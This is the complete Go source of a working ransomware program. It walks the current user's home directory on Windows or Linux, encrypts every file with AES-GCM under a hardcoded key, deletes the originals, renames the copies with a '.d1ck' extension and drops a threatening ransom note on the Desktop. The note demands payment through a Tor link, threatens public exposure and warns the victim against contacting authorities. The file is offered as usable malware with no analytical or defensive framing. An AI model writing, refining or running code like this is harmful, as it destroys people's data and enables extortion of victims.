package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
)

func create_ransom_letter(ransom_letter_path string) {
	// ransom letter content
	content := `Listen up, you pathetic excuse for a human. I know you're panicking right now, but trust me, you haven't seen anything yet.
You thought your precious files were safe and secure? Maybe in your dreams, sucker. Every. Single. File. Gone.
Now you have 24 hours to pay up. If not, all your dirty little secrets will be splashed all over the front page of every major news outlet. 
Your marriage will crumble, your career will be over, and you'll lose everything that matters to you.

Don't even think about contacting authorities. 
We're watching you. And trust me, you don't want that kind of attention.

Download TOR browser. Open this link: br34ch-br4ts.firebaseapp.com. Follow the instructions.

You have one shot. Make it count.
Failure to pay up and your life will descend into hell. Consider this your only warning.
Pay up or suffer the consequences.

Time's ticking... Come on! Don't waste it sitting there reading this.

One more thing, you overprivileged shithead: I'm not bluffing.
You wouldn't want to find out the hard way, right? Pay up or else. 
The choice is yours.

Remember, your time is running out... Suckers.


Br34ch br4ts`

	ransom_letter_path = ransom_letter_path + "\\READ THIS, IDIOT.txt"
	f, err := os.Create(ransom_letter_path) // create the txt
	if err != nil {
		// log.Fatal(err)
	}
	defer f.Close()

	_, err2 := f.WriteString(content) // write inside the txt
	if err2 != nil {
		// log.Fatal(err2)
	}
}

func encrypt_file(file_path string) { // see: https://medium.com/@mertkimyonsen/encrypt-a-file-using-go-f1fe3bc7c635
	file_contents, err := os.ReadFile(file_path) // open and read the file
	if err != nil {
		// log.Fatalf("Read file error occured: %v", err.Error())
	}

	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e")

	// create a cipher block based on the secret key
	block, err := aes.NewCipher(secret_key)
	if err != nil {
		// log.Fatalf("Cipher error occured: %v", err.Error())
	}

	// create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		// log.Fatalf("Cipher GCM error: %v", err.Error())
	}

	// generate random nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		// log.Fatalf("Nonce  error: %v", err.Error())
	}

	// prepare the encrypted file contents
	enc_contents := gcm.Seal(nonce, nonce, file_contents, nil)

	// add the .d1ck extension to the current file extension
	var enc_file_path string = file_path + ".d1ck"

	// create the encrypted file
	err = os.WriteFile(enc_file_path, enc_contents, 0777)
	if err != nil {
		// log.Fatalf("Write file error: %v", err.Error())
	}

	// remove the old file
	os.Remove(file_path)
}

func explore_directory(parent_dir string) {
	err := filepath.WalkDir(parent_dir, func(path string, file fs.DirEntry, err error) error {
		if !file.IsDir() { // it's a file, not a directory
			encrypt_file(path)
		} else {
		} // don't encrypt the folder (but the files inside, see the 'if' block)
		return nil
	})

	if err != nil {
		// log.Fatalf("Impossible to walk directory: %s", err)
	}
}

func osWindows() {
	current_user, err := user.Current()
	if err != nil {
		// log.Fatal(err)
	}

	var user_dir string = current_user.HomeDir           // user path: C:\Users\this_user
	if _, err := os.Stat(user_dir); os.IsNotExist(err) { // check if the directory exists
		// log.Fatalf("Directory %s doesn't exist, check the code please :)", user_dir)
	}
	explore_directory(user_dir)

	var file_path string = filepath.Join(user_dir, "/Desktop")
	create_ransom_letter(file_path)
}

func osLinux() {
	current_user, err := user.Current()
	if err != nil {
		// log.Fatal(err)
	}

	var home_dir string = current_user.HomeDir           // home path: /home/thisuser
	if _, err := os.Stat(home_dir); os.IsNotExist(err) { // check if the directory exists
		// log.Fatalf("Directory %s doesn't exist, check the code please :)", home_dir)
	}
	explore_directory(home_dir)

	var file_path string = filepath.Join(home_dir, "/Desktop")
	create_ransom_letter(file_path)
}

func main() {
	switch runtime.GOOS {
	case "windows":
		osWindows()
	case "linux":
		osLinux()
	default:
		// other operating systems
	}
}
